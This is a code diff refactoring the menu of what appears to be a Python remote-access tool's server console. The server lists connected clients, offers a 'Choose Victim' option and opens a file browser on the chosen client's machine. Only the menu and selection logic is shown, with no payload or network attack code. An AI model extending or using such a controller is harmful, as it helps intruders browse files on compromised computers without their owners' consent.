@@ -47,18 +47,15 @@ class Server:
 
     def run(self):
         self._enable_threading()
-
         Menu(self).main_menu()
 
-        if 2:
-            client_id = raw_input("Choose wisely: ")
-            os.system('clear')
-            try:
-                with self.locking:
-                    client = self.connections[int(client_id)]
-                FileBrowser(client).run()
-            except IndexError:
-                print("Index does not exist. \n")
+    def find_client(self, client_id):
+        try:
+            with self.locking:
+                client = self.connections[int(client_id)]
+            return client
+        except IndexError:
+            print("Index does not exist. \n")
 
 
 class FileBrowser:
@@ -123,7 +120,7 @@ class Menu:
         self.server = server
         self.menu_actions = {
             'main_menu': self.main_menu,
-            '1': self.refresh_connections,
+            '1': self.show_connections,
             '2': self.choose_victim,
             '9': self.back,
             '0': self.exit,
@@ -133,7 +130,7 @@ class Menu:
         os.system('clear')
         print "Welcome,\n"
         print "Please choose the menu you want to start:"
-        print "1. Refresh Connections"
+        print "1. Show Connections"
         print "2. Choose Victim"
         print "\n0. Quit"
         choice = raw_input(" >>  ")
@@ -153,7 +150,7 @@ class Menu:
                 self.menu_actions['main_menu']()
         return
 
-    def refresh_connections(self):
+    def show_connections(self):
         print "Connections !\n"
         self.server.refresh_connections()
         print "9. Back"
@@ -162,11 +159,14 @@ class Menu:
         self.exec_menu(choice)
 
     def choose_victim(self):
-        print "Hello Menu 2 !\n"
-        print "9. Back"
-        print "0. Quit"
+        self.server.refresh_connections()
         choice = raw_input(" >>  ")
-        self.exec_menu(choice)
+        client = self.server.find_client(choice)
+        if client:
+            FileBrowser(client).run()
+        else:
+            print "Invalid selection, please try again.\n"
+        self.menu_actions['main_menu']()
         return
 
     def back(self):
